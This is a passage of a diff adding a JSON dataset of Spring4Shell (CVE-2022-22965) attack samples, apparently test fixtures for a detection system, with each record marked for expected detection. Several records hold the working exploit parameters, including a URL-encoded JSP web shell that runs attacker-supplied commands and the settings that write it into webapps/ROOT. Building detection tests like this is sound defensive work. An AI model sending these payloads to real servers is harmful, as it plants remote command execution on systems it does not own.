+    "source_ip": "188.96.147.139",
+    "timestamp": "2026-03-13T21:53:09.060841"
+  },
+  {
+    "id": "spring4shell_0077",
+    "type": "spring4shell",
+    "cve": "CVE-2022-22965",
+    "payload": "module.classLoader.classLoaderResources.context.parent.pipeline.first.pattern=...",
+    "severity": "critical",
+    "expected_detection": true,
+    "source_ip": "146.217.223.247",
+    "timestamp": "2026-03-13T21:53:09.060845"
+  },
+  {
+    "id": "spring4shell_0078",
+    "type": "spring4shell",
+    "cve": "CVE-2022-22965",
+    "payload": "module.classLoader.classLoaderResources.context.parent.pipeline.first.pattern=...",
+    "severity": "critical",
+    "expected_detection": true,
+    "source_ip": "160.96.179.44",
+    "timestamp": "2026-03-13T21:53:09.060850"
+  },
+  {
+    "id": "spring4shell_0079",
+    "type": "spring4shell",
+    "cve": "CVE-2022-22965",
+    "payload": "module.classLoader.classLoaderResources.context.parent.pipeline.first.pattern=...",
+    "severity": "critical",
+    "expected_detection": true,
+    "source_ip": "167.246.242.94",
+    "timestamp": "2026-03-13T21:53:09.060854"
+  },
+  {
+    "id": "spring4shell_0080",
+    "type": "spring4shell",
+    "cve": "CVE-2022-22965",
+    "payload": "class.module.classLoader.resources.context.parent.pipeline.first.pattern=%25%7Bc2%7Di%20if(%22j%22.equals(request.getParameter(%22pwd%22)))%7B%20java.io.InputStream%20in%20%3D%20%25%7Bc1%7Di.getRuntime().exec(request.getParameter(%22cmd%22)).getInputStream()%3B%20int%20a%20%3D%20-1%3B%20byte%5B%5D%20b%20%3D%20new%20byte%5B2048%5D%3B%20while((a%3Din.read(b))!%3D-1)%7B%20out.println(new%20String(b))%3B%20%7D%20%7D%20%25%7Bsuffix%7Di",
+    "severity": "critical",
+    "expected_detection": true,
+    "source_ip": "3.212.74.20",
+    "timestamp": "2026-03-13T21:53:09.060859"
+  },
+  {
+    "id": "spring4shell_0081",
+    "type": "spring4shell",
+    "cve": "CVE-2022-22965",
+    "payload": "class.module.classLoader.resources.context.parent.pipeline.first.suffix=.jsp",
+    "severity": "critical",
+    "expected_detection": true,
+    "source_ip": "148.89.233.248",
+    "timestamp": "2026-03-13T21:53:09.060866"
+  },
+  {
+    "id": "spring4shell_0082",
+    "type": "spring4shell",
+    "cve": "CVE-2022-22965",
+    "payload": "module.classLoader.classLoaderResources.context.parent.pipeline.first.pattern=...",
+    "severity": "critical",
+    "expected_detection": true,
+    "source_ip": "183.86.57.164",
+    "timestamp": "2026-03-13T21:53:09.060870"
+  },
+  {
+    "id": "spring4shell_0083",
+    "type": "spring4shell",
+    "cve": "CVE-2022-22965",
+    "payload": "class.module.classLoader.resources.context.parent.pipeline.first.prefix=tomcatwar",
+    "severity": "critical",
+    "expected_detection": true,
+    "source_ip": "20.141.85.106",
+    "timestamp": "2026-03-13T21:53:09.060875"
+  },
+  {
+    "id": "spring4shell_0084",
+    "type": "spring4shell",
+    "cve": "CVE-2022-22965",
+    "payload": "class.module.classLoader.resources.context.parent.pipeline.first.directory=webapps/ROOT",
+    "severity": "critical",
+    "expected_detection": true,
+    "source_ip": "24.137.97.245",
+    "timestamp": "2026-03-13T21:53:09.060879"
+  },
+  {
+    "id": "spring4shell_0085",
+    "type": "spring4shell",
+    "cve": "CVE-2022-22965",
+    "payload": "class.module.classLoader.resources.context.parent.pipeline.first.fileDateFormat=",
+    "severity": "critical",
+    "expected_detection": true,
+    "source_ip": "167.65.158.234",
+    "timestamp": "2026-03-13T21:53:09.060884"
+  },
+  {
+    "id": "spring4shell_0086",
+    "type": "spring4shell",
+    "cve": "CVE-2022-22965",
+    "payload": "class.module.classLoader.resources.context.parent.pipeline.first.fileDateFormat=",
+    "severity": "critical",
+    "expected_detection": true,
+    "source_ip": "174.60.0.214",
+    "timestamp": "2026-03-13T21:53:09.060888"
+  },
+  {
+    "id": "spring4shell_0087",
+    "type": "spring4shell",
+    "cve": "CVE-2022-22965",
+    "payload": "class.module.classLoader.resources.context.parent.pipeline.first.pattern=%25%7Bc2%7Di%20if(%22j%22.equals(request.getParameter(%22pwd%22)))%7B%20java.io.InputStream%20in%20%3D%20%25%7Bc1%7Di.getRuntime().exec(request.getParameter(%22cmd%22)).getInputStream()%3B%20int%20a%20%3D%20-1%3B%20byte%5B%5D%20b%20%3D%20new%20byte%5B2048%5D%3B%20while((a%3Din.read(b))!%3D-1)%7B%20out.println(new%20String(b))%3B%20%7D%20%7D%20%25%7Bsuffix%7Di",
+    "severity": "critical",
+    "expected_detection": true,
+    "source_ip": "173.239.84.93",
+    "timestamp": "2026-03-13T21:53:09.060892"
+  },
+  {
+    "id": "spring4shell_0088",
+    "type": "spring4shell",
+    "cve": "CVE-2022-22965",
+    "payload": "class.module.classLoader.resources.context.parent.pipeline.first.prefix=tomcatwar",
+    "severity": "critical",
+    "expected_detection": true,
+    "source_ip": "177.3.251.159",
+    "timestamp": "2026-03-13T21:53:09.060897"
+  },
+  {
+    "id": "spring4shell_0089",
+    "type": "spring4shell",
+    "cve": "CVE-2022-22965",
+    "payload": "module.classLoader.classLoaderResources.context.parent.pipeline.first.pattern=...",
+    "severity": "critical",
+    "expected_detection": true,
+    "source_ip": "48.45.9.178",
+    "timestamp": "2026-03-13T21:53:09.060901"
+  },
+  {
+    "id": "spring4shell_0090",
+    "type": "spring4shell",
+    "cve": "CVE-2022-22965",
+    "payload": "class.module.classLoader.resources.context.parent.pipeline.first.directory=webapps/ROOT",
+    "severity": "critical",
+    "expected_detection": true,
+    "source_ip": "196.15.191.26",
+    "timestamp": "2026-03-13T21:53:09.060906"
+  },
+  {
+    "id": "spring4shell_0091",
+    "type": "spring4shell",
+    "cve": "CVE-2022-22965",
+    "payload": "module.classLoader.classLoaderResources.context.parent.pipeline.first.pattern=...",
+    "severity": "critical",
+    "expected_detection": true,
+    "source_ip": "182.216.193.197",
+    "timestamp": "2026-03-13T21:53:09.060910"
+  },
+  {
+    "id": "spring4shell_0092",
+    "type": "spring4shell",
+    "cve": "CVE-2022-22965",
+    "payload": "module.classLoader.classLoaderResources.context.parent.pipeline.first.pattern=...",
+    "severity": "critical",
+    "expected_detection": true,
+    "source_ip": "213.227.176.81",
+    "timestamp": "2026-03-13T21:53:09.060915"
+  },
+  {
+    "id": "spring4shell_0093",
+    "type": "spring4shell",
+    "cve": "CVE-2022-22965",
+    "payload": "class.module.classLoader.resources.context.parent.pipeline.first.suffix=.jsp",
+    "severity": "critical",
+    "expected_detection": true,
+    "source_ip": "87.14.8.14",
+    "timestamp": "2026-03-13T21:53:09.060929"
+  },
+  {
+    "id": "spring4shell_0094",
+    "type": "spring4shell",
+    "cve": "CVE-2022-22965",
+    "payload": "module.classLoader.DefaultAssertionStatus=n",
+    "severity": "critical",
+    "expected_detection": true,
+    "source_ip": "45.178.176.243",
+    "timestamp": "2026-03-13T21:53:09.060934"
+  },
+  {
+    "id": "spring4shell_0095",
+    "type": "spring4shell",
+    "cve": "CVE-2022-22965",
+    "payload": "class.module.classLoader.resources.context.parent.pipeline.first.suffix=.jsp",
+    "severity": "critical",
+    "expected_detection": true,
+    "source_ip": "47.158.231.59",
+    "timestamp": "2026-03-13T21:53:09.060939"
+  },
+  {
+    "id": "spring4shell_0096",
+    "type": "spring4shell",
+    "cve": "CVE-2022-22965",
+    "payload": "class.module.classLoader.resources.context.parent.pipeline.first.pattern=%25%7Bc2%7Di%20if(%22j%22.equals(request.getParameter(%22pwd%22)))%7B%20java.io.InputStream%20in%20%3D%20%25%7Bc1%7Di.getRuntime().exec(request.getParameter(%22cmd%22)).getInputStream()%3B%20int%20a%20%3D%20-1%3B%20byte%5B%5D%20b%20%3D%20new%20byte%5B2048%5D%3B%20while((a%3Din.read(b))!%3D-1)%7B%20out.println(new%20String(b))%3B%20%7D%20%7D%20%25%7Bsuffix%7Di",
+    "severity": "critical",
+    "expected_detection": true,
+    "source_ip": "87.97.225.156",
+    "timestamp": "2026-03-13T21:53:09.060943"
+  },
+  {
+    "id": "spring4shell_0097",
+    "type": "spring4shell",
+    "cve": "CVE-2022-22965",
+    "payload": "class.module.classLoader.resources.context.parent.pipeline.first.pattern=%25%7Bc2%7Di%20if(%22j%22.equals(request.getParameter(%22pwd%22)))%7B%20java.io.InputStream%20in%20%3D%20%25%7Bc1%7Di.getRuntime().exec(request.getParameter(%22cmd%22)).getInputStream()%3B%20int%20a%20%3D%20-1%3B%20byte%5B%5D%20b%20%3D%20new%20byte%5B2048%5D%3B%20while((a%3Din.read(b))!%3D-1)%7B%20out.println(new%20String(b))%3B%20%7D%20%7D%20%25%7Bsuffix%7Di",
+    "severity": "critical",
+    "expected_detection": true,
+    "source_ip": "191.203.141.134",
+    "timestamp": "2026-03-13T21:53:09.060948"
+  },
+  {
+    "id": "spring4shell_0098",
+    "type": "spring4shell",
+    "cve": "CVE-2022-22965",
+    "payload": "class.module.classLoader.resources.context.parent.pipeline.first.fileDateFormat=",
+    "severity": "critical",
+    "expected_detection": true,
+    "source_ip": "142.149.254.69",
+    "timestamp": "2026-03-13T21:53:09.060952"
+  },
+  {
+    "id": "spring4shell_0099",
+    "type": "spring4shell",
+    "cve": "CVE-2022-22965",
+    "payload": "class.module.classLoader.resources.context.parent.pipeline.first.prefix=tomcatwar",
+    "severity": "critical",
+    "expected_detection": true,
+    "source_ip": "94.51.177.7",
+    "timestamp": "2026-03-13T21:53:09.060957"
+  }
+]
